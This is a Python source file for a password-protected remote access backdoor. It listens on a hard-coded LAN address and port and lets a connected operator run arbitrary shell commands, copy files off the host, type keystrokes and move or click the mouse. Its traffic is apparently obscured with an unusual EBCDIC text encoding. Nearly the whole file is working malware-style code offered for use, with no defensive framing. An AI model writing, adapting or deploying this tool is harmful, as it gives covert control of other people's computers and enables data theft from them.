import socket
import sys
import subprocess
import os
import tqdm
from pynput.keyboard import Key, Controller
import mouse
import threading

global keybord
keybord = Controller()
global keybord_on
keybord_on = 0

def create_socket():
    global host
    global port
    global s
    host = "192.168.43.242"
    port = 9999
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as er:
        print(er)

def binding():
    global bindd
    try:
        global s
        global host
        global port
        bindd = 1
        s.bind((host,port))
        s.listen(5)
    except:
        bindd = 0
        binding()

def accept_conn():
    global s
    conn,addr = s.accept()
    print(f"connection from {addr}")
    conn.send("please enter password : ".encode('ebcdic_cp_nl'))
    c_pass = conn.recv(200).decode('ebcdic_cp_nl')
    if str(c_pass) == "helloxt":
        syn = f"\ngreat now you can use our services .. \n{os.getcwd()}>  ^1"
        conn.send(str(syn).encode('ebcdic_cp_nl'))
        get_run_cmd(conn)
        conn.close()
        print(f"connection from {addr} is closed")
        main() 
    else:
        syn = f"\nsorry incorrect password you have inserted..^0"
        conn.send(str(syn).encode('ebcdic_cp_nl'))
        conn.close()
        print(f"connection from {addr} is closed")
    

    

def get_run_cmd(s):
    while True:
        current_path = str(os.getcwd()+">  ")
        cmd = s.recv(300)
        cmdm = cmd.decode('ebcdic_cp_nl')
        print(cmdm)

        if cmdm == "quit":
            break
        elif cmdm == "quitboth":  # if command is quit then loop is break and also this command send first to server so server has also break execution of their main loop
            sys.exit()
        elif cmdm[:7] == "cpythis":
            try:
                filename = cmdm[8:]
                filesize = os.path.getsize(filename)
                s.send(f"{filename}^{filesize}".encode('ebcdic_cp_nl'))
                sended_size = 0
                progress = tqdm.tqdm(range(filesize), f"Sending {filename[:11]}", unit="B", unit_scale=True, unit_divisor=1024)
                with open(filename, "rb") as f:
                    while sended_size < filesize:
                        bytes_read = f.read(4096)
                        s.send(bytes_read)
                        progress.update(len(bytes_read))
                        sended_size += len(bytes_read)
                print("file send successful")
                
            except:
                s.close()
                main()

        elif cmdm[:2] == "km":
            # try:
                # while True:
            words = cmdm[3:]
            for cr in words:
                keybord.press(cr)
                keybord.release(cr)
            s.send(current_path.encode('ebcdic_cp_nl'))
            # except:
            #     s.close()
        elif cmdm[:2] == "mm":
            mouse_command = cmdm[3:]

            if mouse_command == "cl":
                mouse.click('left')
            elif mouse_command == "cr":
                mouse.click('right')
            elif mouse_command == "cm":
                mouse.click('middle')
            else:
                try:
                    y_pos , x_pos = mouse_command.split("*")
                    mouse.move(int(x_pos),int(y_pos),absolute=False, duration=0.2)
                except:
                    pass
            s.send(current_path.encode('ebcdic_cp_nl'))

        elif cmdm[:2] == "cd":
            try:
                os.chdir(cmdm[3:])
                current_path = str(os.getcwd()+">  ")
                s.send(current_path.encode('ebcdic_cp_nl'))
            except:
                s.send(str(current_path + "\n folder not found").encode('ebcdic_cp_nl'))
        elif cmdm == " ":
            s.send(current_path.encode('ebcdic_cp_nl'))
        else:
            out = subprocess.Popen(str(cmdm) , shell=True ,stdout=subprocess.PIPE , stdin=subprocess.PIPE , stderr=subprocess.PIPE)

            output= str(current_path + "\n" +  out.stdout.read().decode())
            err = str(out.stderr.read().decode())

            if(err):
                s.send(str(current_path + "\n" + err).encode('ebcdic_cp_nl'))
            else:
                s.send(output.encode('ebcdic_cp_nl'))


def main():
    global bindd
    try:
        create_socket()
        binding()
        if bindd == 1:
            print("waiting for connections...")
        accept_conn()
    except:
        print("some error occure please contact admin")

main()
# x1 = threading.Thread(target=main)
# x2 = threading.Thread(target=main)
# x1.start()
# x2.start()
# x1.join()
# x2.join()
